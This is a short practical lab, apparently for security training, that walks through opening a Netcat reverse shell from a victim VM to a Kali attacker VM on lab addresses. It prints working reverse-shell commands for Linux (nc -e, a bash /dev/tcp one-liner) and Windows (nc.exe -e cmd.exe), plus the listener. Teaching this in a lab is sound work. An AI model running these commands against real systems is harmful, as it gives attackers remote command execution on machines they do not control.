# Netcat - Practical Lab

## Objective
Establish a reverse shell connection from a compromised victim machine back to an attacker machine to gain remote command execution.

## Environment
- **Attacker VM:** Kali Linux (IP: 192.168.1.100)
- **Victim VM:** Ubuntu/Windows Server (IP: 192.168.1.105)

## Scenario Steps

### Step 1: Set up the Listener (Attacker)
On the Kali Linux machine, open a terminal and set up a Netcat listener on port 4444 to catch the incoming shell connection.
```bash
nc -nvlp 4444
```
*Expected Output:* `listening on [any] 4444 ...`

### Step 2: Execute the Payload (Victim)
Simulate command execution on the victim machine. Depending on the OS, run the following command to connect back to the attacker.

**If Victim is Linux:**
```bash
nc -e /bin/bash 192.168.1.100 4444
```
*(If `-e` is not supported, use the bash reverse shell one-liner):*
```bash
bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'
```

**If Victim is Windows:**
```cmd
nc.exe -e cmd.exe 192.168.1.100 4444
```

### Step 3: Verify Access (Attacker)
Return to the Kali Linux terminal. You should see a connection established message. You now have interactive shell access to the victim machine.

```bash
connect to [192.168.1.100] from (UNKNOWN) [192.168.1.105] 51324
whoami
ip addr
```

### Step 4: Cleanup
Type `exit` in the shell to close the connection. Note how the Netcat listener on the attacker machine also terminates.
